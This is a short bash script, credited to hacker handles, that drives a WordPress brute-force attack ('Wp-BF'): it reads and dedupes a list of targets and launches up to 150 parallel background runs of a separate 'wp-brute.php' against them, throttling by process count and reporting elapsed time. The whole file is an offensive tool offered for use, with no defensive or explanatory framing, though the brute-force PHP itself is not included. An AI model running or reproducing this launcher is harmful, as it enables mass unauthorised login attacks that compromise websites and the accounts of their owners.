// by r00ter | tornetwork@exploit.im
 
datainicial=`date +%s`
echo "Wp-BF by n4sss. Multithread on"
echo "Wait the brute in the background :D "
 
cat $1 | sort | uniq > mfu.txt
CONTOR=0
for i in `cat mfu.txt`
do
CONTOR=`ps aux | grep -c php`
 
while [ $CONTOR -ge 150 ];do
CONTOR=`ps aux | grep -c php`
echo "Sleeping"
sleep 5
done
 
if [ $CONTOR -le 150 ]; then
php wp-brute.php $i > /dev/null &
fi
 
done
datafinal=`date +%s`
soma=`expr $datafinal - $datainicial`
resultado=`expr 10800 + $soma`
tempo=`date -d @$resultado +%H:%M:%S`
echo " Tempo gasto: $tempo "
